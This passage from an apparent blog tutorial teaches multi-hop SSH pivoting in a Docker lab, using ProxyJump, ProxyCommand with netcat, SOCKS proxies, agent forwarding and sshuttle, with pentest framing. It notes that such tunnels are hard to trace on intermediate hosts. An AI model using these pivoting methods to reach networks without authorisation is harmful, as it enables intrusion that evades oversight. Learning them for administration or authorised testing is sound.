And this is because you are in the moment of the connection [at another system](https://serverfault.com/questions/843149/ssh-warning-no-hostip-for-proxy-command) one or more hops away from the default
1:1 connection which is stored in your known hosts file.

<pre><code class="bash">doeti &lt;id_outside&gt; bash
netstat -atlnp | grep 127 | grep 9999
tcp        0      0 127.0.0.1:9999          0.0.0.0:*               LISTEN      106/ssh

curl 127.0.0.1:9999
&lt;html&gt;&lt;body&gt;&lt;h1&gt;Hi from inside server&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;
</code></pre>

Also be aware that your connection can be seen in between in the following way:

<img src="{{ page.image-base | prepend:site.baseurl }}/multihop_ssh_J_ps_out.png" width="100%" alt="multihop_ssh_J_ps_out">

So the administrator in one of the intermediate systems can see what user connected and opened a tunnel, but can not sniff the traffic.
Furthermore, no user can be seen with `w` and `who`s command in the inbetween systems. So it isn't possible to detect from where someone comes in this way and since when.
However, in the last server, the administrator can list the connected user and since what time he/she is in the system:

<img src="{{ page.image-base | prepend:site.baseurl }}/multihop_ssh_J_last_server.png" width="100%" alt="multihop_ssh_J_last_server">

If you take a closer look you recognise that the output shows the IP 192.168.3.5 which is not 192.168.1.3 - the IP of the outside system. 192.168.3.5 and 192.168.2.111 are at the same device.
So you only get the IP from the last gateway into the current network. 

If you want to have the multi hop jumping more convenient you can use the SSH config located in ~/.ssh/config.
This allows you to pack many options into a short call. We'll see more details in a moment.

### SSH Config using "-J"

The equivalent of `-J` switch in ssh config is `ProxyJump`. Be sure not to confuse it with `ProxyCommand`, I talk about this later. 

In a general way this looks like:

<pre><code class="bash">cat config

### The Remote Host
Host remote-host-nickname
  HostName remote-hostname
  ProxyJump bastion-host-nickname
</code></pre>

For

<pre><code class="bash">ssh -J jumphost@192.168.1.5,jumphost@192.168.2.111 inside_server@192.168.3.50
</code></pre>

this would be

<pre><code class="bash">Host jumphost
    Hostname 192.168.1.5
    User jumphost

Host inside_gateway
    ProxyJump jumphost
    Hostname 192.168.2.111
    User jumphost

Host inside_inside_server
    ProxyJump inside_gateway
    Hostname 192.168.3.50
    User inside_server
</code></pre>

<img src="{{ page.image-base | prepend:site.baseurl }}/multihop_ssh_config_J.png" width="100%" alt="multihop_ssh_config_J">

This declares for each jump host what jump host before it has to use.

You now just need to use the alias to login:

In the outside server enter:

<pre><code class="bash">ssh inside_inside_server
</code></pre>

or 

<pre><code class="bash">ssh inside_gateway
</code></pre>

to log in to the intermediate jumphost inside_gateway.

You can do it also more concise if you don't need the internal jump hosts as aliases for the command line. 
Then you can only use inside_inside_server, but not
the aliases jumphost or inside_gateway:

<pre><code class="bash">
Host inside_inside_server
    ProxyJump jumphost@192.168.1.5,jumphost@192.168.2.111
    Hostname 192.168.3.50
    User inside_server
</code></pre>

Side note: If you don't want to use the default location in ~/.ssh/config you can use the 
<a href="https://superuser.com/questions/1357394/non-default-location-for-ssh-config-file-in-linux">`-F` flag</a> which specifies an 
alternative spot like `ssh -F ~/sshspecialconfigs/configinfrastructurexy inside_inside_server`.

After that you can also use the additional tools from OpenSSH the same way.

To copy files from a to b over ssh:

<pre><code class="bash">scp <source_file> inside_inside_server:<remote_location>
</code></pre>

<img src="{{ page.image-base | prepend:site.baseurl }}/multihop_ssh_J_scp.png" width="100%" alt="multihop_ssh_J_scp">

<pre><code class="bash">scp inside_inside_server:<remote_location> <location_at_your_computer>
</code></pre>

<img src="{{ page.image-base | prepend:site.baseurl }}/multihop_ssh_J_scp_back.png" width="100%" alt="multihop_ssh_J_scp_back">

The same applies to sftp:

<img src="{{ page.image-base | prepend:site.baseurl }}/multihop_ssh_J_sftp.png" width="100%" alt="multihop_ssh_J_sftp">

Side note: If the scenarios become more complex, 
you also have the option of storing different configurations. 
For example, name scenario 1 `~/.ssh/config_files/scenario1.config` and scenario 2 `~/.ssh/config_files/scenario2.config`.
If you are now in scenario 1, load the file with `ssh -F ~/.ssh/config_files/scenario1.config` and for scenario 2 
`ssh -F ~/.ssh/config_files/scenario2.config`.

## Multiple Hops Socks Proxy

You can also tunnel a socks proxy over multiple hops:

In the outside container do:

<pre><code class="bash">ssh -D -J jumphost@192.168.1.5 jumphost@192.168.2.111
</code></pre>

And login until you reach 192.168.2.111.
Both ssh server are jumphosts with 2 network interfaces. The first cuts 192.168.1.x from 192.168.2.x. The second 192.168.2.x from 192.168.3.x.
So if you reach the second jumphost you can reach everything inside this network.

Try to reach the server 192.168.3.50 from here:

<pre><code class="bash">curl http://192.168.3.50
<html><body><h1>Hi from inside server</h1></body></html>
</code></pre>

The same should now be possible using the socks proxy created at your outside container.

<pre><code class="bash">deti <outside_id> bash

curl http://192.168.3.50 -x socks://127.0.0.1:5432
<html><body><h1>Hi from inside server</h1></body></html>

</code></pre>

The same applies if you use a config like explained in [SSH config using -J](#ssh-config-using--j):

<pre><code class="bash">ssh -D 5432 inside_inside_server
</code></pre>

### Local PortForwarding combined with Socks

If you cannot use the "-J" switch what is always possible is to use local portforwarding combined with the socks proxy.

In the outside container create local port forward to the first hop:

<pre><code class="bash">
ssh -L 2222:localhost:8501 jumphost@192.168.1.5
</code></pre>

From here start the socks proxy:

<pre><code class="bash">ssh -D 8501 jumphost@192.168.2.111
</code></pre>

Now you should reach the same internal server in outside:

<pre><code class="bash">deti <outside_id> bash

curl http://192.168.3.50 -x socks://127.0.0.1:2222
<html><body><h1>Hi from inside server</h1></body></html>

</code></pre>

Disadvantage from this technique is that you start a socks proxy visible in between. You could extend that using multiple hops chaining local port forwarding but this has the downside that at each hop
you can connect to the socks proxy. More about this in chapter [Insecure Multi Hop Connection](#insecure-multi-hop-connection)

If you have a password as login this seems reasonable. But what if you want to use private and public key to connect which is rather common.
This way you don't need to enter a password anymore, you can automate the ssh connection and use it in a script for example. This is done due to private and public key work together.
The private key is at your client. The public key at the server you want to connect.
The ssh client uses the locally private key. The ssh server at the other side its stored public key.
To connect via multiple hops you have to save the public key at all hops along the way.

To make sure that the ssh-client pulls the right private key out of your pocket every time you jump, you need <a href="https://www.ssh.com/academy/ssh/agent">ssh-agent</a>.

## Establish asymmetric authorized multi hop connection

First you need to create a key pair of a private and public key:

<pre><code class="bash">doeti &lt;id_outside&gt;
ssh-keygen -t rsa -b 2048 -f /root/.ssh/id_rsa_jumphost
</code></pre>

This is already done in our demo infrastructure.

Now we will start ssh-agent and add this created key:

<pre><code class="bash">exec ssh-agent bash
ssh-add /root/.ssh/id_rsa_jumphost
</code></pre>

The passphrase is `supersecret`.

Next, let's add this keypair to all the servers we mentioned before:

The first server is jumphost 192.168.1.5:

<pre><code class="bash">ssh-copy-id -i /root/.ssh/id_rsa_jumphost.pub jumphost@192.168.1.5
</code></pre>

Password is `jumphost`.

This copies the public key into the file /home/jumphost/.ssh/authorized_keys at jumphost.

The steps in this section are also scripted in the demo if you want to execute them faster:

<pre><code class="bash">doeti &lt;id_outside&gt;
exec ssh-agent bash
./copypubkey_jumphost.exp
</code></pre>

### Copy public keys without ssh-copy-id

You can now connect to jumphost using your private key from the key pair:

<pre><code class="bash">ssh -i /root/.ssh/id_rsa_jumphost jumphost@192.168.1.5
</code></pre>

Since you added the private key to ssh-agent you don't have to enter the passphrase anymore.

You can find your public key in the server in `authorized_keys`:

<pre><code class="bash">ssh -i /root/.ssh/id_rsa_jumphost jumphost@192.168.1.5
</code></pre>

<img src="{{ page.image-base | prepend:site.baseurl }}/publickey_authorized_keys.png" width="100%" alt="Public Key authorized keys">

Now, you want to copy your public key to the next server which is jumphost 192.168.2.111. `ssh-copy-id` is not possible because you are not at your system.
Use the `authorized_keys` file for that, since it contains your public key which is needed for you to connect. 

To copy `authorized_keys` to the next server and add it to its `authorized_keys` do:

<pre><code class="bash">cat ~/.ssh/authorized_keys | ssh jumphost@192.168.2.111 "mkdir -p ~/.ssh && cat >> ~/.ssh/authorized_keys"
</code></pre>

This is essentially the same as `ssh-copy-id` does, but you have no private key at this system in the .ssh folder.

Password is again: `jumphost`.

Connect to this server from your current location (using the mentioned `jumphost` as pass).

<pre><code class="bash">ssh jumphost@192.168.2.111
</code></pre>

Here perform the same procedure as with the next server:

<pre><code class="bash">cat ~/.ssh/authorized_keys | ssh inside_server@192.168.3.50 "mkdir -p ~/.ssh && cat >> ~/.ssh/authorized_keys"
</code></pre>

This time the password is `inside_server`. Type two times `exit` to exit jump host 192.168.2.111 and 192.168.1.5.

Finished! 

### SSH Config using ssh-agent "-A" "-t" "-J"

You can now connect to the inner system 192.168.3.50 from your kali box with ssh-agent jumping over multiple hops without entering a single password:

If you set up the asymmetric public keys like in previous chapter described and have a newer version of ssh you can use the '-J' switch without interaction.

You can also now use a config file to make it easier to reuse.
New commands in comparison to chapter [SSH Config using "-J"](#ssh-config-using--j) are

<pre><code class="bash">-A:
ForwardAgent yes

-t:
RequestTTY yes
</code></pre>

ForwardAgent enables SSH agent forwarding. RequestTTY is good to ensure that an interactive session will be definitely established.

Enter the outside server and create the following file:

<pre><code class="bash">cat ~/.ssh/config

IdentityFile /root/.ssh/id_rsa_jumphost

Host jumphost
    RequestTTY force
    ForwardAgent yes
    Hostname 192.168.1.5
    User jumphost

Host inside_gateway
    ProxyJump jumphost
    RequestTTY force
    ForwardAgent yes
    Hostname 192.168.2.111
    User jumphost

Host inside_inside_server
    ProxyJump inside_gateway
    RequestTTY force
    ForwardAgent yes
    Hostname 192.168.3.50
    User inside_server
</code></pre>

After that you can call this shortcut:

<pre><code class="bash">ssh inside_inside_server
</code></pre>

Be aware you need ProxyJump alias `-J` switch for that.
But this is not in all SSH versions available. If you are in a pentest and on older system it could be the case that you can not use that. 
Then you need to switch from `ProyxJump` to `ProxyCommand`:

## ProxyCommand

There is one option of `ssh` which is available since it <a href="https://security.stackexchange.com/questions/264541/proxycommand-implemented-in-which-openssh-version/264542#264542">exists</a>.
This is <a href="https://man7.org/linux/man-pages/man5/ssh_config.5.html">`ProxyCommand`</a>
It can be used to specify the command used to connect to next server.

### -W switch

The most convenient way (although not as convenient as with `ProxyJump`) is to use `ProxyCommand` in combination with the `-W` switch.

This switch the so-called <a href="https://www.openssh.com/txt/release-5.4">Stdio-to-Local Forward 'netcat' Mode `-W`</a> exists since <a href="<a href="http://www.openssh.com/txt/release-5.4">OpenSSH 5.4 2010-03-08</a>.
The functionality of this switch is that it can be used to connect stdio on the client to a single port forwarded on the server.
This can also be used to connect multiple ssh network nodes, but you need `ProxyCommand` as run time parameter or an ssh config (explained later).

It is not an explicit switch for multi hopping but ensures in combination with `ProxyCommand` that you can connect multiple hops in between with source and end target.
However, it doesn't need netcat installed on the intermediary machines like in versions before 5.4 (see also later). 

<img src="{{ page.image-base | prepend:site.baseurl }}/ssh_config_tokens.png" width="100%" alt="SSH Config Tokens">

This switch has the following structure:

<pre><code class="bash">-W host:port
</code></pre>

You must therefore specify a host and port to which the client forwards its standard input and output

The syntax to use it for multi hopping is like the following:

<pre><code class="bash">doeti &lt;id_outside&gt; bash
ssh -o &#39;ProxyCommand=ssh -W %h:%p -q jumphost@192.168.1.5&#39; inside_server@192.168.2.50
</code></pre>

You see that looks much more complicated than with "-J". 
`-o` is the same as to take a column from a ssh configuration file (only that you add an extra = sign between command and option).

`%h` and `%p` are placeholders used by the ssh command to dynamically insert information about the connection being established.

Here's what they represent:

- `%h`: This expands to the hostname of the remote server you're connecting to. In this case, it will be replaced with "192.168.1.5".
- `%p`: This expands to the port number on the remote server that the SSH connection will be established on. The default SSH port is 22. So %p will become 22, but it could be configured differently

Side note: To configure another port for the in between host you could use:

<pre><code class="bash">doeti &lt;id_outside&gt; bash
ssh -o &#39;ProxyCommand=ssh -p 2213 -W %h:%p -q jumphost@192.168.1.5&#39; inside_server@192.168.2.50
</code></pre>

This would connect to 192.168.1.5 using port 2213 and direct standard in- and output to `%p` port 2213.

You could also use ssh-agent as described in [the chapter before](#copy-public-keys-without-ssh-copy-id):

<pre><code class="bash">doeti &lt;id_outside&gt; bash
ssh -o &#39;ProxyCommand=ssh -i /root/.ssh/rsa_key -W %h:%p -q jumphost@192.168.1.5&#39; inside_server@192.168.2.50
</code></pre>

where `rsa_key` is the private key of the key pair whereas the public key has to be stored at jumphost.

#### Port Forwarding with -W switch 

To realize port forwarding this way execute:

<pre><code class="bash">doeti &lt;id_outside&gt; bash
ssh -o &#39;ProxyCommand=ssh -W %h:%p -q jumphost@192.168.1.5&#39; inside_server@192.168.2.50 -L 127.0.0.1:7777:127.0.0.1:80
</code></pre>

You can also put an `-N` at the end, so it doesn't open an interactive shell:

<pre><code class="bash">doeti &lt;id_outside&gt; bash
ssh -o &#39;ProxyCommand=ssh -W %h:%p -q jumphost@192.168.1.5&#39; inside_server@192.168.2.50 -L 127.0.0.1:7777:127.0.0.1:80 -N
</code></pre>

#### Multiple intermediate hops with -W switch

If you now want to switch several hops between start and end, you have to nest them:

<pre><code class="bash">doeti &lt;id_outside&gt; bash
ssh -oProxyCommand="ssh -W %h:%p -oProxyCommand=\"ssh -W %%h:%%p jumphost@192.168.1.5\" jumphost@192.168.2.111" inside_server@192.168.3.50
</code></pre>

After that in another window

<pre><code class="bash">doeti &lt;id_outside&gt; bash

netstat -atlnp | grep 127
tcp        0      0 127.0.0.1:7777          0.0.0.0:*               LISTEN      101/ssh

curl 127.0.0.1:7777
&lt;html&gt;&lt;body&gt;&lt;h1&gt;Hi from inside server&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;
</code></pre>

Be aware that `-L` both with and without `-N` like the [`-J` switch](#j-switch-ssh) can be seen within the system as 2 additional sshd processes showing currently connected to the system:

<img src="{{ page.image-base | prepend:site.baseurl }}/multihop_ssh_W_N_users.png" width="100%" alt="Multihop SSH W N Users">

And like `-J`, no user can be seen with `w` and `who`s command in the inbetween systems.

`ProxyCommand` competes with `ProxyJump`. So only use one option per Host.

You can put it in a config file like `ProxyJump` and after that it is much easier to call this multi hop jump.
This is an advantage compared to use only ssh commands like in the first chapters about multi hopping.

#### SSH config using ProxyCommand -W switch

<pre><code class="bash">cat ~/.ssh/config 
Host jumphost
    Hostname 192.168.1.5
    User jumphost

Host inside_gateway
    ProxyCommand ssh -W %h:%p -q jumphost
    Hostname 192.168.2.111
    User jumphost

Host inside_inside_server
    ProxyCommand ssh -W %h:%p -q inside_gateway
    Hostname 192.168.3.50
    User inside_server

</code></pre>

If you have keypairs you can add `IdentityFile /home/user/.ssh/rsa_key` in each `Host` section with user current user of the intermediate system and
`rsa_key` the private key found at this server. 

Now you can call it with:

<pre><code class="bash">ssh inside_inside_server
</code></pre>

As mentioned the "-W" switch exist since the 2010 version of OpenSSH. If you still get an older version you can use the following method if Netcat and OpenSSH exist on the systems.

Be aware that you can not mix up ProxyCommand and ProxyJump in an ssh config file. 
SSH will use the first found directive and block the other one for the rest of the config file.

### Netcat

In this case you can use ProxyCommand and <a href="https://en.wikipedia.org/wiki/Netcat">netcat</a> if it is installed at the intermediate hosts (jumphost) additionally to the ssh clients.

Netcat offers you the possibility establish an ssh connection using: 

<pre><code class="bash">nc ip 22
</code></pre>

<img src="{{ page.image-base | prepend:site.baseurl }}/MultiHop.svg" width="100%" alt="MultiHop Svg">

So if you want to cascade multiple connections you can do:

For 192.168.1.5 to 192.168.2.111 go inside the outside box and do (both different server have "jumphost" as password):

<pre><code class="bash">ssh -oProxyCommand="ssh jumphost@192.168.1.5 nc -q0 192.168.2.111 22" jumphost@192.168.2.111
</code></pre>

This first connects to 192.168.1.5 and then to 192.168.2.111.

In this case the SSH protocol is forwarded by nc instead of ssh. 

The -q0 flag is needed so that ssh closes the connection <a href="<a href="https://stackoverflow.com/questions/41776718/what-exactly-does-the-q-option-of-netcat-do">`-q0`>properly</a>.
To be a little more quiet (using the -q flag for ssh):

<pre><code class="bash">ssh -oProxyCommand="ssh -q jumphost@192.168.1.5 nc -q0 192.168.2.111 22" jumphost@192.168.2.111
</code></pre>

Note that Netcat must be installed on all intermediate instances. In this case on the one intermediate instance. Otherwise no connection will be established:

<img src="{{ page.image-base | prepend:site.baseurl }}/multihop_ssh_nc_not_installed_single_hop.png" width="100%" alt="multihop_ssh_nc_not_installed_single_hop">

### Port Forwarding with Netcat 

To port forward is pretty straight forward:

<pre><code class="bash">
ssh -oProxyCommand="ssh jumphost@192.168.1.5 nc -q0 192.168.2.50 22" -L 127.0.0.1:7777:127.0.0.1:80 inside_server@192.168.2.50
</code></pre>

#### Multiple intermediate hops with Netcat

To jump over 3 hops:

192.168.1.5 -> 192.168.2.111 -> 192.168.3.50

execute:

<pre><code class="bash">ssh -oProxyCommand="ssh -q -oProxyCommand=\"ssh -q jumphost@192.168.1.5 nc -q0 192.168.2.111 22\" jumphost@192.168.2.111 nc -q0 192.168.3.50 22" inside_server@192.168.3.50
</code></pre>

<img src="{{ page.image-base | prepend:site.baseurl }}/multihop_ssh_nc.png" width="100%" alt="multihop_ssh_nc">

This uses the structure:

<div id="html" markdown="0" class="mermaid">flowchart TD

subgraph Z[" "]
direction LR
A["ssh"] --> B["-o ProxyCommand"]
B -->|next IP using ssh| B
B --> C[&lt;target&gt;]
end
</div>

You can also do it this way by giving the target first:

<div id="html" markdown="0" class="mermaid">flowchart TD

subgraph Z[" "]
direction LR
A["ssh"] --> C[&lt;target&gt;]
C --> B["-o ProxyCommand"]
B -->|next IP using ssh| B
end
</div>

For some people, it makes it a bit more readable because the nesting comes bundled at the end.

<pre><code class="bash">ssh inside_server@192.168.3.50 -oProxyCommand="ssh jumphost@192.168.2.111 -oProxyCommand=\"ssh jumphost@192.168.1.5 nc -q0 192.168.2.111 22\" nc -q0 192.168.3.50 22" 
</code></pre>

<img src="{{ page.image-base | prepend:site.baseurl }}/multihop_ssh_nc_target_first.png" width="100%" alt="multihop_ssh_nc_target_first">

Here it is the same as with just one hop. Netcat must be installed on all intermediate instances:

<img src="{{ page.image-base | prepend:site.baseurl }}/multihop_ssh_nc_not_installed_multi_hop.png" width="100%" alt="multihop_ssh_nc_not_installed_multi_hop">

#### SSH config using ProxyCommand with netcat

To do ssh config the netcat way:

Enter the outside server and create the following file:

<pre><code class="bash">cat ~/.ssh/config

Host jumphost
Hostname 192.168.1.5
User jumphost

Host inside_gateway
ProxyCommand ssh -q jumphost nc -q0 192.168.2.111 22
Hostname 192.168.2.111
User jumphost

Host inside_inside_server
ProxyCommand ssh -q inside_gateway nc -q0 192.168.3.50 22
Hostname 192.168.3.50
User inside_server
</code></pre>

After that you can call this shortcut:

<pre><code class="bash">ssh inside_inside_server
</code></pre>

For example to copy a file to from 192.168.1.3 to 192.168.3.50:

<pre><code class="bash">scp filetocopy inside_inside_server@/tmp/filetocopy
</code></pre>

ssh -oProxyCommand="ssh jumphost@192.168.2.111 -oProxyCommand=\"ssh jumphost@192.168.1.5 nc -q0 192.168.2.111 22\" nc -q0 192.168.3.50 22" inside_server@192.168.3.50

You add <a href="https://stackoverflow.com/questions/41776718/what-exactly-does-the-q-option-of-netcat-do">`-q0`</a> to stop each connection fully in case the whole connection was cancelled.

This needs netcat to be installed on the intermediate systems after jumphost and ssh client at jumphost.

x https://stackoverflow.com/questions/22635613/what-is-the-difference-between-ssh-proxycommand-w-nc-exec-nc
x https://en.wikibooks.org/wiki/OpenSSH/Cookbook/Proxies_and_Jump_Hosts
-> Old Methods of Passing Through Jump Hosts
--> Old: Recursively Chaining an Arbitrary Number of Hosts

nc at jumphost necessary

<pre><code class="bash">doeti &lt;id_outside&gt; bash 

cd ~/.ssh

cat config
Host runthrough
ProxyCommand ssh -q jumphost@192.168.1.5 nc -q0 192.168.2.50 22
User inside_server
LocalForward 127.0.0.1:3333 127.0.0.1:80
</code></pre>

ssh runthrough

Another window

<pre><code class="bash">doeti &lt;id_outside&gt; bash 

netstat -atln | grep 127.0.0.1
tcp        0      0 127.0.0.11:39493        0.0.0.0:*               LISTEN

curl 127.0.0.1:3333
&lt;html&gt;&lt;body&gt;&lt;h1&gt;Hi from inside server&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;
</code></pre>

### Using no proxy commands

There is a last opportunity to do multi hoping with SSH. This will nearly always do and could be your last resort if the other options fail. 

You don't need to have netcat installed in between.  You just need OpenSSH server at all systems running from the first you jump into.
However, it is insecure, you should not use it for port forwarding. See in the next chapter why.

The command will become long and interactive, so not so usable if you have to repeat it often.

To jump over multiple ssh server into a session using one command you can do:

<pre><code class="bash">doeti &lt;id_outside&gt; bash 

ssh -tt -l jumphost 192.168.1.5 ssh -tt -l jumphost 192.168.2.111 ssh -tt -l inside_server 192.168.3.50
</code></pre>

The `-l` switch is for the username and could also be written like this:

<pre><code class="bash">ssh -tt jumphost@192.168.1.5 ssh -tt jumphost@192.168.2.111 ssh -tt inside_server@192.168.3.50
</code></pre>

The `-t` switch is necessary because ssh normally treats everything after `ssh host [here]` at [here] as a non_interactive script.
This means there won't be any possibility to interact with ssh in a second ssh command which is at the place of [here].
The result would be no further shell will get started. To force an interactive Shell `-t` must be added.    
<a href="https://serverfault.com/questions/1113915/difference-between-t-and-tt-ssh">Multiple -tt options force a terminal even if stdin is only feeding ssh not your local shell</a>.

To get a deeper grasp about the switch `-t` of this topic you can read <a href="https://stackoverflow.com/a/42516402">this nice stack overflow answer to it</a>.

You need ssh server installed at all intermediate systems.
This happens if you install <a href="https://askubuntu.com/questions/814723/whats-the-difference-between-ssh-and-openssh-packages">openssh-server (server) or ssh (both server and client), but not only the openssh-client (the client)</a>

#### Asymmetric cryptography 

To jump using already installed asymmetric keys (c.f. [](#establish-asymmetric-authorized-multi-hop-connection)) you can use:

<pre><code class="bash">ssh -i /root/.ssh/id_rsa_jumphost -tt -A jumphost@192.168.1.5 ssh -tt -A jumphost@192.168.2.111 ssh -tt -A inside_server@192.168.3.50
</code></pre>

<img src="{{ page.image-base | prepend:site.baseurl }}/sshagent_multiplehops.png" width="100%" alt="SSH Agent Multiple Hops">

The `-A` option transfers login data to ssh-agent. It does it by getting the key on the respective host by forwarding the request to the client beforehand and answering it at the end from the first local ssh client.

Ok, let's do local port forwarding! Let's try to get access to the deeper shells and tunnel a web server to your kali box:

<pre><code class="bash">doeti &lt;id_outside&gt; bash
ssh -A -t -L 127.0.0.1:9996:127.0.0.1:9996 jumphost@192.168.1.5 ssh -A -t -L 127.0.0.1:9996:127.0.0.1:9996 jumphost@192.168.2.111 ssh -A -t -L 127.0.0.1:9996:127.0.0.1:80 -N inside_server@192.168.3.50
</code></pre>

Be aware that you don't need `-tt` because you don't need an interactive shell, but you need `-t` to interact and enter credentials in each next jump host.

Be aware that as long as the connection exist everybody in between can connect to inside server:

<pre><code class="bash">deti <jumphost_id> bash

netstat -tulpen
tcp        0      0 127.0.0.1:9996          0.0.0.0:*               LISTEN      1000       235952     -               

curl http://127.0.0.1:9996 
<html><body><h1>Hi from inside server</h1></body></html>

</code></pre>

To be more precise: Your session, any forwarded agent, X11 server, and sockets are exposed to the intermediate hosts.

Therefore, if you do it this way, you should be the only user on the intermediate systems, or you should not care that other users can access the system associated with port forwarding.

If you can call it in aforementioned proxy methods nobody in between can directly connect:

<pre><code class="bash">
ssh -J jumphost@192.168.1.5,jumphost@192.168.2.111 inside_server@192.168.3.50 -L 127.0.0.1:9996:127.0.0.1:80 -N 
</code></pre>

<pre><code class="bash">
ssh -oProxyCommand="ssh -W %h:%p -oProxyCommand=\"ssh -W %%h:%%p jumphost@192.168.1.5\" jumphost@192.168.2.111" inside_server@192.168.3.50 -N
</code></pre>

<pre><code class="bash">ssh -oProxyCommand="ssh -q -oProxyCommand=\"ssh -q jumphost@192.168.1.5 nc -q0 192.168.2.111 22\" jumphost@192.168.2.111 nc -q0 192.168.3.50 22" inside_server@192.168.3.50 -N
</code></pre>

After you executed 

<pre><code class="bash">doeti &lt;id_outside&gt; bash
ssh -A -t -L 127.0.0.1:9996:127.0.0.1:9996 jumphost@192.168.1.5 ssh -A -t -L 127.0.0.1:9996:127.0.0.1:9996 jumphost@192.168.2.111 ssh -A -t -L 127.0.0.1:9996:127.0.0.1:80 -N inside_server@192.168.3.50
</code></pre>

open another window and you can connect inside:
    
<pre><code class="bash">doeti &lt;id_outside&gt; 
curl http://127.0.0.1:9996
&lt;html&gt;&lt;body&gt;&lt;h1&gt;Hi from inside server&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;
</code></pre>

Note that you can use `-N` in the last part, but not `-Nf`. Also `-t` is not needed anymore because you don't want an interactive shell just a local port forwarding.

#### Insecure Multi Hop Connection

Be aware that like a normal SSH connection everything is encrypted between the tunnel. So after the tunnel if you do local portforwarding it's like raw port forwarding in [chapter "Local Port Forwarding without tunneling](#local-port-forwarding-without-tunneling).
So if you do local portforwarding, use `-L 127.0.0.1:[port_here]:[ip_in_the_other_network]:[port_there]` and `[ip_in_the_other_network]` is an IP different to the local system, everything which is in between the last hop ip and the IP in that
network is unencrypted and can be sniffed.

You change it to an end-to-end encrypted connection if you can find a way all hops until the last one have an ssh server running and use one of the beforementioned solutions like
"-J","-W" or netcat-based. The encryption is done over the ssh connections in between.
Then you don't need local port forwarding with an external ip, you establish the connection to the server you want to get the service from and fetch it from localhost to localhost.

So this

<pre><code class="bash">doeti &lt;id_outside&gt; bash 
ssh -J jumphost@192.168.1.5,jumphost@192.168.2.111 inside_server@192.168.3.50 -L 127.0.0.1:9999:127.0.0.1:80
</code></pre>

<pre><code class="bash">doeti &lt;id_outside&gt; bash
outside:root@<id_outide>:/# netstat -tulpen | grep 9999
tcp        0      0 127.0.0.1:9999          0.0.0.0:*               LISTEN      0          274991     32/ssh              
outside:root@<id_outide>:/# curl 127.0.0.1
<html><body><h1>Hi from outside server</h1></body></html>
</code></pre>

is more secure than

<pre><code class="bash">doeti &lt;id_outside&gt; bash 
ssh -J jumphost@192.168.1.5 jumphost@192.168.2.111 -L 127.0.0.1:9999:192.168.3.50:80
</code></pre>

<pre><code class="bash">doeti &lt;id_outside&gt; bash
outside:root@<id_outide>:/# netstat -tulpen | grep 9999
tcp        0      0 127.0.0.1:9999          0.0.0.0:*               LISTEN      0          289530     32/ssh              
outside:root@<id_outide>:/# curl 127.0.0.1
<html><body><h1>Hi from outside server</h1></body></html>
</code></pre>

Be also aware that in every hop in this chain there is a tunnel listening at 127.0.0.1. So anyone who is at jumphost 192.168.1.5 or jumphost 192.168.2.111 can connect to it respectively.

You can verify this. Open the multi hop port forwarding tunnel and go into 192.168.1.5:

<pre><code class="bash">doeti &lt;id_jumphost&gt; bash 
netstat -tulpen | grep 9998
tcp        0      0 127.0.0.1:9998          0.0.0.0:*               LISTEN      1000           -  

curl http://127.0.0.1:9998
&lt;html&gt;&lt;body&gt;&lt;h1&gt;Hi from inside server&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;
</code></pre>

So if you sit on an intermediate hops you can now connect to the internal server if you use 127.0.0.1:9998!

If you look into the `-A` option of `ssh-agent` you find this description:

<pre><code class="bash">man ssh | grep -A 6 -- &#39;-A\s\s&#39;
     -A      Enables forwarding of connections from an authentication agent such as ssh-agent(1).  This can also be specified on a per-
             host basis in a configuration file.

             Agent forwarding should be enabled with caution.  Users with the ability to bypass file permissions on the remote host (for
             the agent&#39;s UNIX-domain socket) can access the local agent through the forwarded connection.  An attacker cannot obtain key
             material from the agent, however they can perform operations on the keys that enable them to authenticate using the identi‐
             ties loaded into the agent.  A safer alternative may be to use a jump host (see -J).
</code></pre>

So it is recommended to use the `-J` switch because `-A` can also be insecure.

### sshuttle 

https://github.com/sshuttle/sshuttle

doeti &lt;id_outside&gt; bash

sshuttle -r jumphost@192.168.1.5 192.168.2.0/24

outside:root@xxx:/# sshuttle -r jumphost@192.168.1.5 192.168.2.0/24
The authenticity of host &#39;192.168.1.5 (192.168.1.5)&#39; can&#39;t be established.
ECDSA key fingerprint is ....
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added &#39;192.168.1.5&#39; (ECDSA) to the list of known hosts.
jumphost@192.168.1.5&#39;s password:
c : Connected to server.

doeti &lt;id_outside&gt; bash

curl http://192.168.2.50
&lt;html&gt;&lt;body&gt;&lt;h1&gt;Hi from inside server&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;

# FAQ

## Docker without sudo

If you have installed docker in the standard installation it runs without sudo.
This is not recommended from a security perspective as it allows privilege escalation:
<a href="https://flast101.github.io/docker-privesc/">https://flast101.github.io/docker-privesc/</a>


## Pool overlaps
If you get

<pre><code class="bash">ERROR: Pool overlaps with other one on this address space
</code></pre>

Change the IPs to ones that don't bother you by changing the value x at 192.168.x.? or delete any clashing networks in the Docker network with

<pre><code class="bash">sudo docker network ls
sudo docker network rm &lt;id&gt;
</code></pre>
